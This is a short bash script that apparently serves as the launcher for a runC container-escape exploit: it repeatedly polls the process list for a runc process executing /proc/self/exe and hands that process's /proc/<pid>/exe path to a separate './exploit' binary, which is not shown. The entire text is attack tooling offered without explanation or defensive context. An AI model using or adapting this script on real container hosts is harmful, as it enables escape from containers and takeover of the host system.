#!/bin/bash

echo "Waiting for runC to be executed"

while true ; do
  runc_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')

  while [ -z "$runc_pid" ] ; do
    runc_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')
  done

  ./exploit /proc/${runc_pid}/exe
done
